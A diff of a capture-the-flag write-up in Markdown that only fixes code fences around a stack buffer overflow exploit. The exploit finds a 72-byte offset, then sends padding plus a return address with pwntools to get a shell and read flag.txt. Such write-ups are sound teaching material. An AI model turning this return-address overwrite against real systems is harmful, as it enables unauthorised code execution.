@@ -64,7 +64,8 @@ while(True):
 	else:
 		print(n,'is the offset')
 		break
-	n+=1```
+	n+=1
+```
 
 From this script, the offset came out to be **72**. Now, it's time to finally find our flag.
 I ran this script:
@@ -79,7 +80,8 @@ payload=b'A'*72+p64(0x004006d6)
 
 r=remote(host,port)
 r.sendline(payload)
-r.interactive()```
+r.interactive()
+```
 
 And, yay! I got the shell.
 I typed in 'ls' and saw that there's a flag.txt file in there, so i did a 'cat flag.txt' and got the flag!
